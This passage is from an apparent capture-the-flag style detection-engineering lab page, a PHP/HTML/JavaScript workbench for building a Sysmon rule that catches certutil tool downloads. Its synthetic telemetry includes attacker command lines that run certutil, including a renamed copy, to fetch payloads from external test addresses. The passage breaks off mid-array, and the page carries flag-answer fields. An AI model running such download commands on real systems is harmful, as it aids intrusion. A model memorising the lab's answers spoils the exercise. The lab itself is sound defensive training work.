<?php
// FILENAME: detection-engineering-lifecycle-practical.php
require_once __DIR__ . '/../../includes/auth.php';
if (!$auth->isLoggedIn()) { $auth->redirectToLogin(); }
$page_title = 'Detection Spec Workbench';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?= htmlspecialchars($page_title) ?></title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
:root {
    --bg-primary: #0b0f1a; --bg-secondary: #12182b; --bg-surface: #161d36;
    --text-primary: #e6e9f2; --text-secondary: #aab0d6; --text-muted: #7c83b6;
    --accent-primary: #6ae3ff; --accent-secondary: #8b7bff;
    --success: #3dff9a; --error: #ff5c5c; --warning: #ffd36a;
    --border-default: rgba(255,255,255,0.08); --border-strong: rgba(255,255,255,0.16);
    --glow-accent: 0 0 12px rgba(106,227,255,0.35);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { background: var(--bg-primary); }
body { color: var(--text-primary); font-family: "Inter", system-ui, sans-serif; line-height: 1.6; min-height: 100vh; overflow-x: hidden; }
html.scroll-locked, body.scroll-locked { overflow: hidden; }
code, pre, .mono { font-family: "JetBrains Mono", monospace; }
.wrap { max-width: 1280px; margin: 0 auto; padding: 24px 20px 80px; }
.page-header { display: flex; justify-content: space-between; align-items: flex-start; gap: 20px; padding: 22px 24px;
    background: linear-gradient(135deg, var(--bg-secondary), var(--bg-surface)); border: 1px solid var(--border-default); border-radius: 14px; margin-bottom: 20px; }
.page-header h1 { font-size: 1.6rem; color: var(--accent-primary); line-height: 1.25; }
.page-header p { color: var(--text-secondary); font-size: 0.95rem; margin-top: 4px; }
.btn, .btn-tutorial { background: transparent; color: var(--accent-primary); border: 1px solid var(--accent-primary); border-radius: 8px;
    padding: 8px 14px; font: 600 0.88rem "Inter", sans-serif; cursor: pointer; white-space: nowrap; }
.btn:hover:not(:disabled), .btn-tutorial:hover, .btn:focus-visible { box-shadow: var(--glow-accent); outline: none; }
.btn:disabled { opacity: 0.4; cursor: not-allowed; }
.btn-primary { background: var(--accent-primary); color: var(--bg-primary); }
.btn-small { padding: 5px 10px; font-size: 0.8rem; }
.card { background: var(--bg-secondary); border: 1px solid var(--border-default); border-radius: 14px; padding: 20px 22px; margin-bottom: 20px; }
.card h2 { font-size: 1.1rem; margin-bottom: 10px; }
.card p, .card li { color: var(--text-secondary); font-size: 0.93rem; }
.card ol, .card ul { margin: 8px 0 4px 20px; }
.section-label { font-size: 0.72rem; letter-spacing: .12em; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; font-weight: 600; }
.status-bar { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
.pill { background: var(--bg-surface); border: 1px solid var(--border-strong); border-radius: 999px; padding: 5px 14px; font-size: 0.85rem; color: var(--text-secondary); }
.pill b { color: var(--text-primary); font-family: "JetBrains Mono", monospace; font-weight: 600; }
.env-layout { display: grid; grid-template-columns: minmax(0, 1fr) 330px; gap: 20px; align-items: start; }
.env-layout > * { min-width: 0; }
.tool-area { background: var(--bg-secondary); border: 1px solid var(--border-default); border-radius: 14px; padding: 16px; min-height: 320px; }
.tabs { display: flex; flex-wrap: wrap; gap: 6px; border-bottom: 1px solid var(--border-default); padding-bottom: 12px; margin-bottom: 16px; }
.tab { background: var(--bg-surface); color: var(--text-secondary); border: 1px solid var(--border-default); border-radius: 8px; padding: 7px 12px; font: 600 0.85rem "Inter", sans-serif; cursor: pointer; }
.tab.active { color: var(--bg-primary); background: var(--accent-primary); border-color: var(--accent-primary); }
.panel { display: none; }
.panel.active { display: block; }
.sub { background: var(--bg-surface); border: 1px solid var(--border-default); border-radius: 12px; padding: 16px; margin-bottom: 16px; }
.sub h3 { font-size: 1rem; margin-bottom: 8px; color: var(--text-primary); }
.sub p { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 8px; }
.kv { display: grid; grid-template-columns: 150px minmax(0, 1fr); gap: 4px 12px; font-size: 0.88rem; }
.kv dt { color: var(--text-muted); }
.kv dd { color: var(--text-primary); }
.quote { border-left: 3px solid var(--accent-secondary); padding: 8px 12px; color: var(--text-primary); background: rgba(139,123,255,0.07); border-radius: 0 8px 8px 0; margin: 8px 0; font-size: 0.9rem; }
.form-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px 16px; }
.field { display: block; font-size: 0.82rem; color: var(--text-muted); }
.field > span { display: block; margin-bottom: 4px; }
.inp, .sel { width: 100%; background: #070a14; color: var(--text-primary); border: 1px solid var(--border-strong); border-radius: 8px; padding: 8px 10px; font: 500 0.86rem "JetBrains Mono", monospace; }
.sel { font-family: "Inter", sans-serif; }
.inp:focus, .sel:focus { outline: none; border-color: var(--accent-primary); }
.inp[readonly] { color: var(--text-secondary); }
.tbl-wrap { overflow-x: auto; border: 1px solid var(--border-default); border-radius: 10px; }
table.data { border-collapse: collapse; width: 100%; font-size: 0.8rem; }
table.data th { background: #0e1426; color: var(--text-primary); text-align: left; padding: 8px 10px; font-weight: 600; white-space: nowrap; border-bottom: 1px solid var(--border-strong); }
table.data td { padding: 7px 10px; border-bottom: 1px solid var(--border-default); color: var(--text-secondary); vertical-align: top; white-space: nowrap; font-family: "JetBrains Mono", monospace; }
table.data td.wrapcell { white-space: normal; word-break: break-all; min-width: 260px; max-width: 460px; }
table.data tr:last-child td { border-bottom: none; }
table.data td .sel { min-width: 110px; padding: 5px 8px; }
.pager { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; margin-top: 10px; font-size: 0.82rem; color: var(--text-muted); }
.pager .info { margin-left: 6px; }
.toolbar { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 10px; }
.toolbar .inp { flex: 1 1 220px; width: auto; }
.locked { padding: 26px; text-align: center; color: var(--text-muted); border: 1px dashed var(--border-strong); border-radius: 10px; }
.cond-list { display: flex; flex-direction: column; gap: 8px; margin: 8px 0; }
.cond-row { display: grid; grid-template-columns: 170px 130px minmax(0, 1fr) auto; gap: 8px; align-items: center; }
.excl-block { border: 1px solid var(--border-strong); border-radius: 10px; padding: 10px; margin: 8px 0; }
.excl-head { display: flex; justify-content: space-between; align-items: center; gap: 8px; font-size: 0.82rem; color: var(--text-muted); margin-bottom: 6px; }
.empty-note { font-size: 0.85rem; color: var(--text-muted); }
.msg { font-size: 0.88rem; margin-top: 8px; color: var(--text-secondary); min-height: 1.2em; }
.res-pass { color: var(--success); font-weight: 600; }
.res-fail { color: var(--error); font-weight: 600; }
.suite { font-weight: 700; margin-top: 10px; }
.btn-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
.radio-row { display: flex; flex-wrap: wrap; gap: 14px; font-size: 0.88rem; color: var(--text-secondary); padding-top: 6px; }
.radio-row label { display: inline-flex; gap: 6px; align-items: center; cursor: pointer; }
.cl-list { list-style: none; margin-top: 10px; font-size: 0.85rem; }
.cl-list li { padding: 8px 10px; border: 1px solid var(--border-default); border-radius: 8px; margin-bottom: 6px; color: var(--text-secondary); }
.cl-list li b { color: var(--text-primary); }
.criteria { margin: 4px 0 0 20px; font-size: 0.88rem; color: var(--text-secondary); }
.deck { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
.action-card { background: var(--bg-surface); border: 1px solid var(--border-strong); border-radius: 8px; padding: 9px 12px; cursor: pointer; font: 500 0.85rem "Inter", sans-serif; color: var(--text-secondary); text-align: left; flex: 1 1 260px; }
.action-card:hover:not(.chosen) { border-color: var(--accent-primary); color: var(--text-primary); }
.action-card.chosen { border-color: var(--accent-secondary); color: var(--text-muted); opacity: 0.55; cursor: default; }
.log { list-style: none; font-size: 0.85rem; margin-top: 10px; }
.log li { padding: 5px 0; border-bottom: 1px solid var(--border-default); color: var(--text-secondary); }
.log li.bad { color: var(--error); padding-left: 18px; }
#feedback { margin-top: 10px; font-size: .92rem; min-height: 1.3em; }
#flag-area { display: none; margin-top: 14px; padding: 14px; border: 1px solid var(--success); border-radius: 10px; }
#flag-area.show { display: block; }
#flag-output { color: var(--success); font: 700 1.05rem "JetBrains Mono", monospace; word-break: break-all; }
#submit-card .field { margin-bottom: 12px; }
@media (max-width: 900px) {
    .env-layout { grid-template-columns: 1fr; }
    .page-header { flex-direction: column; }
    .form-grid { grid-template-columns: 1fr; }
    .cond-row { grid-template-columns: 1fr 1fr; }
    .cond-row .inp { grid-column: 1 / -1; }
}
@media (max-width: 520px) {
    .wrap { padding: 16px 12px 60px; }
    .kv { grid-template-columns: 1fr; }
    .kv dd { margin-bottom: 6px; }
    .tool-area, .card { padding: 14px; }
}
/* tutorial */
#tutorial-overlay { position: fixed; inset: 0; z-index: 900; display: none; background: transparent; }
#tutorial-spotlight { position: fixed; z-index: 901; display: none; border: 2px solid var(--accent-primary); border-radius: 12px;
    box-shadow: 0 0 0 200vmax rgba(5,8,16,0.78), var(--glow-accent); pointer-events: none; transition: all .18s ease; }
#tutorial-box { position: fixed; z-index: 902; display: none; width: 380px; max-width: calc(100vw - 24px); background: var(--bg-secondary);
    border: 1px solid var(--accent-primary); border-radius: 14px; padding: 18px; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
.guide-open #tutorial-overlay, .guide-open #tutorial-spotlight, .guide-open #tutorial-box { display: block; }
#tutorial-box h3 { color: var(--accent-primary); font-size: 1.02rem; margin-bottom: 6px; }
#tutorial-box .tut-step { font-size: 0.75rem; color: var(--text-muted); margin-bottom: 4px; }
#tut-text { color: var(--text-secondary); font-size: 0.9rem; max-height: 34vh; overflow-y: auto; }
.tut-nav { display: flex; justify-content: space-between; align-items: center; margin-top: 14px; gap: 8px; }
.tut-nav .right { display: flex; gap: 8px; }
</style>
</head>
<body>
<div id="tutorial-overlay"></div>
<div id="tutorial-spotlight"></div>
<div id="tutorial-box" role="dialog" aria-modal="true" aria-labelledby="tut-title">
    <div class="tut-step" id="tut-step"></div>
    <h3 id="tut-title"></h3>
    <p id="tut-text"></p>
    <div class="tut-nav">
        <button type="button" class="btn btn-small" id="tut-skip">Skip</button>
        <div class="right">
            <button type="button" class="btn btn-small" id="tut-prev">Back</button>
            <button type="button" class="btn btn-small btn-primary" id="tut-next">Next</button>
        </div>
    </div>
</div>

<div class="wrap">
    <header class="page-header" id="page-header">
        <div>
            <h1>Detection Spec Workbench</h1>
            <p>Take DET-0217 from requirement REQ-0412 to production: spec, test cases, logic, shadow week, tuning, versioning and promotion.</p>
        </div>
        <button type="button" class="btn-tutorial" id="btn-tutorial">View Tutorial</button>
    </header>

    <section class="card" id="mission-brief">
        <div class="section-label">Mission briefing</div>
        <h2>Turn finding F-03 into a production detection</h2>
        <p>You are the detection engineer who picked up requirement REQ-0412 on 2026-10-07. During purple team exercise PT-2026-09 (2026-09-29 12:00 to 2026-09-30 03:00 UTC) the red team downloaded tools on the exercise hosts ws45 and srv12 with certutil.exe, including a renamed copy and a run from a scheduled task, and nothing alerted. The test capture holds 10 Sysmon Event ID 1 records from 2026-09-29 and 2026-09-30: the exercise events and benign events exported from production hosts on the same dates. Your detection is DET-0217, version 0.1.0, status draft.</p>
        <p style="margin-top:8px">When you deploy, the workbench replays a 7-day shadow week (2026-10-08 00:00:00 to 2026-10-14 23:59:59 UTC) of 38 recorded Sysmon Event ID 1 records from the production hosts. The red team repeated the technique once during that week from one production workstation; the SOC was not told which host or when. All 11 hosts run Sysmon v15.15. All times are UTC.</p>
        <ol>
            <li>Read the requirement, choose the data source and set an expected result for every test case.</li>
            <li>Build the rule and run the test suite until it passes, then deploy to shadow mode.</li>
            <li>Review the shadow matches, tune narrowly, record the change, re-run the suite and the shadow week, and promote.</li>
            <li>Build the lifecycle record in order and submit the three proof values.</li>
        </ol>
    </section>

    <div class="status-bar" id="status-bar">
        <span class="pill">Detection <b>DET-0217</b></span>
        <span class="pill">Version <b id="st-version">0.1.0</b></span>
        <span class="pill">Status <b id="st-status">Draft</b></span>
        <span class="pill">Owner <b>Detection Engineering</b></span>
    </div>

    <div class="env-layout">
        <section class="tool-area" id="tool-area">
            <div class="tabs" id="tabs" role="tablist">
                <button type="button" class="tab active" id="tab-spec" data-panel="panel-spec">Requirement and spec</button>
                <button type="button" class="tab" id="tab-telemetry" data-panel="panel-telemetry">Telemetry</button>
                <button type="button" class="tab" id="tab-rule" data-panel="panel-rule">Rule and tests</button>
                <button type="button" class="tab" id="tab-deploy" data-panel="panel-deploy">Deploy and changelog</button>
                <button type="button" class="tab" id="tab-record" data-panel="panel-record">Lifecycle record</button>
            </div>

            <!-- PANEL: requirement and spec -->
            <div class="panel active" id="panel-spec">
                <div class="sub" id="req-card">
                    <div class="section-label">Requirement (read only)</div>
                    <h3>REQ-0412</h3>
                    <dl class="kv">
                        <dt>Raised</dt><dd>2026-10-02 09:15 UTC</dd>
                        <dt>Source</dt><dd>PT-2026-09 finding F-03</dd>
                        <dt>Owner</dt><dd>Detection Engineering</dd>
                        <dt>Hosts in scope</dt><dd>All 11 hosts (inventory below)</dd>
                    </dl>
                    <div class="quote">The red team used the built-in Windows certificate utility to download tools from outside web servers onto two exercise hosts, once under its own file name and once from a copy stored under another name, and once from a scheduled task. No detection fired. Detect this behaviour on all Windows hosts. Certificate checks, hash checks, cache maintenance and other download tools are outside this requirement.</div>
                </div>

                <div class="sub" id="spec-form">
                    <div class="section-label">Spec: DET-0217</div>
                    <div class="form-grid">
                        <label class="field"><span>Title</span><input type="text" class="inp" id="spec-title" autocomplete="off" placeholder="Short detection title"></label>
                        <label class="field"><span>Owner</span><input type="text" class="inp" id="spec-owner" value="Detection Engineering" readonly></label>
                        <label class="field"><span>ATT&amp;CK technique</span>
                            <select class="sel" id="spec-technique">
                                <option value="">Select a technique</option>
                                <option value="T1105">T1105</option>
                                <option value="T1140">T1140</option>
                                <option value="T1553.004">T1553.004</option>
                                <option value="T1218">T1218</option>
                            </select>
                        </label>
                        <label class="field"><span>Data source</span>
                            <select class="sel" id="spec-source">
                                <option value="">Select a data source</option>
                                <option value="sysmon1">Sysmon Event ID 1 Process creation</option>
                                <option value="sysmon3">Sysmon Event ID 3 Network connection</option>
                                <option value="sysmon11">Sysmon Event ID 11 File create</option>
                                <option value="sec4688">Security 4688 Process creation</option>
                            </select>
                        </label>
                    </div>
                    <div style="margin-top:14px">
                        <div class="section-label">Success criteria (read only)</div>
                        <ol class="criteria">
                            <li>Every test case marked Alert fires.</li>
                            <li>No test case marked No alert fires.</li>
                            <li>Every shadow mode alert is reviewed and no unexplained false positive remains.</li>
                            <li>The full test suite passes again after every change.</li>
                        </ol>
                    </div>
                </div>

                <div class="sub" id="testcase-card">
                    <div class="section-label">Test cases (test capture, Sysmon Event ID 1)</div>
                    <p>Set the expected result for every test case. Full fields for each event are in the Telemetry tab.</p>
                    <div class="tbl-wrap"><table class="data" id="tc-table"></table></div>
                </div>

                <div class="sub" id="inventory-card">
                    <div class="section-label">Host inventory (11 hosts)</div>
                    <div class="tbl-wrap"><table class="data" id="inv-table"></table></div>
                </div>
            </div>

            <!-- PANEL: telemetry -->
            <div class="panel" id="panel-telemetry">
                <div class="sub" id="telemetry-card">
                    <div class="section-label">Telemetry viewer (Sysmon Event ID 1)</div>
                    <div class="toolbar">
                        <button type="button" class="btn btn-small" id="ds-test">Test capture (10)</button>
                        <button type="button" class="btn btn-small" id="ds-shadow">Shadow week</button>
                        <input type="text" class="inp" id="tel-filter" placeholder="Filter any field" autocomplete="off">
                    </div>
                    <div id="tel-body"></div>
                </div>
            </div>

            <!-- PANEL: rule and tests -->
            <div class="panel" id="panel-rule">
                <div class="sub" id="rule-card">
                    <div class="section-label">Rule builder</div>
                    <p>Detection conditions: all must match. Matching is case-insensitive and ignores leading and trailing spaces.</p>
                    <div class="cond-list" id="cond-list"></div>
                    <button type="button" class="btn btn-small" id="btn-add-cond">Add condition</button>
                    <div style="margin-top:16px">
                        <div class="section-label">Exclusions</div>
                        <p>An event that matches every row of any one exclusion block is suppressed.</p>
                        <div id="excl-list"></div>
                        <button type="button" class="btn btn-small" id="btn-add-excl">Add exclusion block</button>
                    </div>
                </div>
                <div class="sub" id="runner-card">
                    <div class="section-label">Test runner</div>
                    <p>Runs the current rule on the test capture and compares each result with the expected result you set in the spec.</p>
                    <button type="button" class="btn btn-primary" id="btn-run-tests">Run tests</button>
                    <div class="msg" id="test-msg"></div>
                    <div id="test-results"></div>
                </div>
            </div>

            <!-- PANEL: deploy and changelog -->
            <div class="panel" id="panel-deploy">
                <div class="sub" id="deploy-card">
                    <div class="section-label">Deploy and tune</div>
                    <p>Deploy is available when the latest test run passed for the current rule. After a rule edit, re-run the shadow week to refresh the matches.</p>
                    <div class="btn-row">
                        <button type="button" class="btn btn-primary" id="btn-deploy" disabled>Deploy to shadow mode</button>
                        <button type="button" class="btn" id="btn-rerun-shadow" disabled>Re-run shadow week</button>
                        <button type="button" class="btn" id="btn-promote" disabled>Promote to production</button>
                    </div>
                    <div class="msg" id="deploy-msg"></div>
                    <div id="shadow-results"></div>
                </div>
                <div class="sub" id="changelog-card">
                    <div class="section-label">Changelog</div>
                    <div class="form-grid">
                        <label class="field"><span>Date</span><input type="text" class="inp" id="cl-date" value="2026-10-15" autocomplete="off"></label>
                        <label class="field"><span>Version</span><input type="text" class="inp" id="cl-version" autocomplete="off" placeholder="MAJOR.MINOR.PATCH"></label>
                    </div>
                    <div class="field" style="margin-top:10px"><span>Change type</span>
                        <div class="radio-row">
                            <label><input type="radio" name="cl-type" id="cl-type-major" value="MAJOR"> MAJOR</label>
                            <label><input type="radio" name="cl-type" id="cl-type-minor" value="MINOR"> MINOR</label>
                            <label><input type="radio" name="cl-type" id="cl-type-patch" value="PATCH"> PATCH</label>
                        </div>
                    </div>
                    <div class="form-grid" style="margin-top:10px">
                        <label class="field"><span>Summary</span><input type="text" class="inp" id="cl-summary" autocomplete="off"></label>
                        <label class="field"><span>Reason</span><input type="text" class="inp" id="cl-reason" autocomplete="off"></label>
                    </div>
                    <div class="btn-row"><button type="button" class="btn" id="btn-add-cl">Add changelog entry</button></div>
                    <div class="msg" id="cl-msg"></div>
                    <ul class="cl-list" id="cl-list"></ul>
                </div>
            </div>

            <!-- PANEL: lifecycle record -->
            <div class="panel" id="panel-record">
                <div class="sub" id="record-card">
                    <div class="section-label">Lifecycle record</div>
                    <p>Click the cards in the order the work on DET-0217 should happen. Not every card belongs in the record. Reset (in the Submit card) restores every card.</p>
                    <div class="deck" id="deck"></div>
                    <ul class="log" id="log"></ul>
                </div>
            </div>
        </section>

        <aside class="card" id="submit-card">
            <div class="section-label">Submit</div>
            <label class="field"><span>Parent process of the shadow mode false positives</span><input type="text" id="ans-1" class="inp" autocomplete="off"></label>
            <label class="field"><span>Host of the true positive the tuned rule alerts on (short hostname, for example srv01)</span><input type="text" id="ans-2" class="inp" autocomplete="off"></label>
            <label class="field"><span>Version after the tuning change</span><input type="text" id="ans-3" class="inp" autocomplete="off"></label>
            <div style="display:flex;gap:8px;flex-wrap:wrap">
                <button type="button" class="btn btn-primary" id="btn-submit">Submit</button>
                <button type="button" class="btn" id="btn-reset">Reset</button>
            </div>
            <p id="feedback"></p>
            <div id="flag-area"><div class="section-label">Flag</div><div id="flag-output"></div></div>
        </aside>
    </div>
</div>

<script>
(function () {
    'use strict';
    var $ = function (id) { return document.getElementById(id); };

    // ===== LAB DATA (synthetic only: cbx.lab, 10.63.0.0/16, RFC 5737 external addresses) =====
    var P = {
        cu: 'C:\\Windows\\System32\\certutil.exe',
        cmd: 'C:\\Windows\\System32\\cmd.exe',
        ps: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        svc: 'C:\\Windows\\System32\\svchost.exe',
        exp: 'C:\\Windows\\explorer.exe',
        pkg: 'C:\\Program Files\\PkgRelay\\pkgrelay.exe',
        msi: 'C:\\Windows\\System32\\msiexec.exe',
        ipc: 'C:\\Windows\\System32\\ipconfig.exe',
        rdp: 'C:\\Windows\\System32\\mstsc.exe',
        who: 'C:\\Windows\\System32\\whoami.exe',
        fs: 'C:\\Windows\\System32\\findstr.exe',
        curl: 'C:\\Windows\\System32\\curl.exe',
        sch: 'C:\\Windows\\System32\\schtasks.exe'
    };
    var CL_CMD = '"C:\\Windows\\system32\\cmd.exe"';
    var CL_PS = '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"';
    var CL_PKG = 'certutil.exe -urlcache -split -f http://srv05.cbx.lab/pkg/viewer-5.2.1.msi C:\\ProgramData\\PkgRelay\\cache\\viewer-5.2.1.msi';
    var CL_MSI = 'msiexec.exe /i C:\\ProgramData\\PkgRelay\\cache\\viewer-5.2.1.msi /qn';
    var SYS = 'NT AUTHORITY\\SYSTEM';
    function R(id, t, host, user, img, ofn, cl, pi, il) {
        return { id: id, UtcTime: t, Computer: host + '.cbx.lab', User: user, Image: img, OriginalFileName: ofn,
                 CommandLine: cl, ParentImage: pi, IntegrityLevel: il };
    }
    var TEST = [
        R('TC-01', '2026-09-29 08:41:17.204', 'ws14', 'CBX\\a.mensah', P.cu, 'CertUtil.exe', 'certutil -hashfile D:\\Images\\ent-24h2.iso SHA256', P.cmd, 'Medium'),
        R('TC-02', '2026-09-29 09:47:05.611', 'ws19', 'CBX\\d.ferreira', P.cu, 'CertUtil.exe', 'certutil -urlcache * delete', P.cmd, 'Medium'),
        R('TC-03', '2026-09-29 11:20:33.087', 'srv03', 'CBX\\j.okoro_adm', P.cu, 'CertUtil.exe', 'certutil -verify -urlfetch C:\\Certs\\srv05.cer', P.ps, 'High'),
        R('TC-04', '2026-09-29 13:02:11.452', 'ws45', 'CBX\\h.lindqvist', P.cu, 'CertUtil.exe', 'certutil.exe -urlcache -split -f http://203.0.113.58/tools/sv.bin C:\\Users\\Public\\sv.bin', P.cmd, 'Medium'),
        R('TC-05', '2026-09-29 13:40:27.930', 'ws45', 'CBX\\h.lindqvist', 'C:\\Users\\Public\\Libraries\\cu.exe', 'CertUtil.exe', 'cu.exe -urlcache -f https://198.51.100.61/a/kit.zip C:\\Users\\Public\\Libraries\\kit.zip', P.ps, 'Medium'),
        R('TC-06', '2026-09-29 15:05:52.318', 'ws33', 'CBX\\m.osei', P.fs, 'FINDSTR.EXE', 'findstr /s /i "urlcache" C:\\IR\\exports\\http-proxy.txt', P.cmd, 'Medium'),
        R('TC-07', '2026-09-29 16:12:09.775', 'srv03', 'CBX\\j.okoro_adm', P.cu, 'CertUtil.exe', 'certutil -addstore -f Root C:\\Certs\\cbx-root.cer', P.ps, 'High'),
        R('TC-08', '2026-09-29 17:31:48.140', 'ws24', 'CBX\\s.ivanova', P.cu, 'CertUtil.exe', 'certutil -decode C:\\Users\\s.ivanova\\Downloads\\cfg.b64 C:\\Users\\s.ivanova\\Downloads\\cfg.xml', P.cmd, 'Medium'),
        R('TC-09', '2026-09-29 18:55:26.502', 'ws11', 'CBX\\k.adeyemi', P.curl, 'curl.exe', 'curl.exe -L -o C:\\Users\\k.adeyemi\\Downloads\\fw-tool.zip https://192.0.2.40/dl/fw-tool.zip', P.cmd, 'Medium'),
        R('TC-10', '2026-09-30 02:15:04.019', 'srv12', SYS, P.cu, 'CertUtil.exe', 'certutil /urlcache /split /f http://203.0.113.58/tools/up.dat C:\\Windows\\Temp\\up.dat', P.svc, 'System')
    ];
    var SHADOW = [
        R('S01', '2026-10-08 07:41:09.318', 'ws11', 'CBX\\k.adeyemi', P.cmd, 'Cmd.Exe', CL_CMD, P.exp, 'Medium'),
        R('S02', '2026-10-08 07:41:30.552', 'ws11', 'CBX\\k.adeyemi', P.ipc, 'ipconfig.exe', 'ipconfig /all', P.cmd, 'Medium'),
        R('S03', '2026-10-08 10:14:22.870', 'ws14', 'CBX\\a.mensah', P.cu, 'CertUtil.exe', 'certutil -hashfile D:\\Packages\\viewer-5.2.1.msi SHA256', P.cmd, 'Medium'),
        R('S04', '2026-10-08 11:47:39.106', 'srv03', 'CBX\\j.okoro_adm', P.ps, 'PowerShell.EXE', 'powershell.exe -NoProfile -Command Invoke-WebRequest -Uri http://srv05.cbx.lab/scripts/inv.ps1 -OutFile C:\\Scripts\\inv.ps1', P.exp, 'High'),
        R('S05', '2026-10-08 14:05:03.447', 'ws24', 'CBX\\s.ivanova', P.rdp, 'mstsc.exe', 'mstsc.exe /v:srv03.cbx.lab', P.exp, 'Medium'),
        R('S06', '2026-10-08 16:22:51.690', 'ws33', 'CBX\\m.osei', P.who, 'whoami.exe', 'whoami /groups', P.cmd, 'Medium'),
        R('S07', '2026-10-09 02:04:13.215', 'ws11', SYS, P.cu, 'CertUtil.exe', CL_PKG, P.pkg, 'System'),
        R('S08', '2026-10-09 02:04:51.733', 'ws11', SYS, P.msi, 'msiexec.exe', CL_MSI, P.pkg, 'System'),
        R('S09', '2026-10-09 02:06:51.402', 'ws14', SYS, P.cu, 'CertUtil.exe', CL_PKG, P.pkg, 'System'),
        R('S10', '2026-10-09 02:07:30.118', 'ws14', SYS, P.msi, 'msiexec.exe', CL_MSI, P.pkg, 'System'),
        R('S11', '2026-10-09 02:09:30.964', 'ws19', SYS, P.cu, 'CertUtil.exe', CL_PKG, P.pkg, 'System'),
        R('S12', '2026-10-09 02:10:08.377', 'ws19', SYS, P.msi, 'msiexec.exe', CL_MSI, P.pkg, 'System'),
        R('S13', '2026-10-09 02:11:02.581', 'ws24', SYS, P.cu, 'CertUtil.exe', CL_PKG, P.pkg, 'System'),
        R('S14', '2026-10-09 02:11:41.026', 'ws24', SYS, P.msi, 'msiexec.exe', CL_MSI, P.pkg, 'System'),
        R('S15', '2026-10-09 02:13:47.839', 'ws27', SYS, P.cu, 'CertUtil.exe', CL_PKG, P.pkg, 'System'),
        R('S16', '2026-10-09 02:14:25.291', 'ws27', SYS, P.msi, 'msiexec.exe', CL_MSI, P.pkg, 'System'),
        R('S17', '2026-10-09 02:16:25.660', 'ws33', SYS, P.cu, 'CertUtil.exe', CL_PKG, P.pkg, 'System'),
        R('S18', '2026-10-09 02:17:04.183', 'ws33', SYS, P.msi, 'msiexec.exe', CL_MSI, P.pkg, 'System'),
        R('S19', '2026-10-09 09:12:36.745', 'ws19', 'CBX\\d.ferreira', P.cmd, 'Cmd.Exe', CL_CMD, P.exp, 'Medium'),
        R('S20', '2026-10-09 13:15:30.209', 'ws33', 'CBX\\m.osei', P.fs, 'FINDSTR.EXE', 'findstr /i "urlcache" C:\\IR\\exports\\http-proxy-1008.txt', P.cmd, 'Medium'),
        R('S21', '2026-10-09 15:40:18.533', 'srv03', 'CBX\\j.okoro_adm', P.sch, 'schtasks.exe', 'schtasks /query /fo LIST', P.ps, 'High'),
        R('S22', '2026-10-10 08:05:27.894', 'ws11', 'CBX\\k.adeyemi', P.curl, 'curl.exe', 'curl.exe -L -o C:\\Users\\k.adeyemi\\Downloads\\fw-tool-2.zip https://192.0.2.40/dl/fw-tool-2.zip', P.cmd, 'Medium'),
        R('S23', '2026-10-10 09:33:41.312', 'ws19', 'CBX\\d.ferreira', P.cu, 'CertUtil.exe', 'certutil -urlcache * delete', P.cmd, 'Medium'),
        R('S24', '2026-10-10 12:18:09.657', 'ws27', 'CBX\\r.achebe', P.rdp, 'mstsc.exe', 'mstsc.exe /v:srv08.cbx.lab', P.exp, 'Medium'),
        R('S25', '2026-10-11 16:47:50.021', 'ws27', 'CBX\\r.achebe', P.cmd, 'Cmd.Exe', CL_CMD, P.exp, 'Medium'),
        R('S26', '2026-10-11 16:48:05.438', 'ws27', 'CBX\\r.achebe', P.cu, 'CertUtil.exe', 'certutil -hashfile C:\\Users\\r.achebe\\Downloads\\setup-3.4.exe SHA256', P.cmd, 'Medium'),
        R('S27', '2026-10-12 09:02:20.876', 'ws14', 'CBX\\a.mensah', P.cmd, 'Cmd.Exe', CL_CMD, P.exp, 'Medium'),
        R('S28', '2026-10-12 09:02:41.149', 'ws14', 'CBX\\a.mensah', P.ipc, 'ipconfig.exe', 'ipconfig /flushdns', P.cmd, 'Medium'),
        R('S29', '2026-10-12 14:26:51.390', 'ws27', 'CBX\\r.achebe', P.cmd, 'Cmd.Exe', CL_CMD, P.exp, 'Medium'),
        R('S30', '2026-10-12 14:27:12.804', 'ws27', 'CBX\\r.achebe', P.who, 'whoami.exe', 'whoami /all', P.cmd, 'Medium'),
        R('S31', '2026-10-12 14:27:39.517', 'ws27', 'CBX\\r.achebe', 'C:\\ProgramData\\Updates\\cuhelper.exe', 'CertUtil.exe', 'cuhelper.exe -urlcache -split -f http://198.51.100.149/u/st.dat C:\\ProgramData\\Updates\\st.dat', P.cmd, 'Medium'),
        R('S32', '2026-10-12 15:55:14.262', 'srv08', 'CBX\\j.okoro_adm', P.ps, 'PowerShell.EXE', CL_PS, P.exp, 'High'),
        R('S33', '2026-10-13 11:02:57.093', 'srv03', 'CBX\\j.okoro_adm', P.cu, 'CertUtil.exe', 'certutil -verify -urlfetch C:\\Certs\\srv08.cer', P.ps, 'High'),
        R('S34', '2026-10-13 13:44:19.618', 'ws11', 'CBX\\k.adeyemi', P.ps, 'PowerShell.EXE', CL_PS, P.exp, 'Medium'),
        R('S35', '2026-10-13 17:20:36.955', 'ws33', 'CBX\\m.osei', P.curl, 'curl.exe', 'curl.exe -I https://198.51.100.150/status', P.cmd, 'Medium'),
        R('S36', '2026-10-14 08:20:16.471', 'ws24', 'CBX\\s.ivanova', P.cu, 'CertUtil.exe', 'certutil -decode C:\\Users\\s.ivanova\\Downloads\\map.b64 C:\\Users\\s.ivanova\\Downloads\\map.xml', P.cmd, 'Medium'),
